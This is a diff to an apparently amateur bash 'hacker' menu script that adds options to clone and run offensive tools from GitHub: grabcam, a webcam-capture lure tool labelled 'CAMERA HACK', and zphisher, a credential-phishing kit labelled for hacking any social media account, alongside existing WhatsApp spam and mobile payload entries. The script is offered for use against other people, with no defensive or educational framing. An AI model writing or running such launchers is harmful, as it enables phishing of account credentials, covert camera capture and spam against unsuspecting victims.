@@ -31,7 +31,9 @@ echo -e "\e[0;31m[4]\e[32m →→→→→→→→→→ SEND LINK CRASH MOBILE
 echo -e "\e[0;31m[5]\e[32m →→→→→→→→→→ CONTANT  "
 echo -e "\e[0;31m[6]\e[32m →→→→→→→→→→ SUPPOT    "
 echo -e "\e[0;31m[7]\e[32m →→→→→→→→→→ MOBILE HACK WITH PALYOD GENERATE "
- echo -e "\e[0;31m[8]\e[32m →→→→→→→→→→ HACK WATSAAP { SPAM }  "
+ echo -e "\e[0;31m[8]\e[32m →→→→→→→→→→ HACK  WATSAAP { SPAM }  "
+echo -e "\e[0;31m[9]\e[32m →→→→→→→→→→ CAMERA HACK { LINK }   "
+echo -e "\e[0;31m[10]\e[32m ================ SOCIAL MEDAYA ANY ACCOUNT { HACK } 
 
 read -p "AKASH HACKER : " AKASH
 if [[ $AKASH == 1 || $AKASH == 01 ]]; then 
@@ -130,6 +132,24 @@ elif [[ $AKASH == 8 || $AKASH == 08 ]]; then
 	clear 
 	cd $HOME/SpamWa-1
 	python3 spam.py
+#menu 3
+
+elif [[ $AKASH == 9 || $AKASH == 09 ]]; then
+                                   
+        clear
+	cd $HOME
+pip install lolcat
+git clone https://github.com/noob-hackers/grabcam
+cd $HOME
+cd grabcam
+bash grabcam.sh
+#menu 10
+elif [[ $AKASH == 10 ]]; then
+        clear
+	cd $HOME
+	git clone git://github.com/htr-tech/zphisher.git
+	cd zphisher
+	bash zphisher.sh
 	
 else                       
 	clear
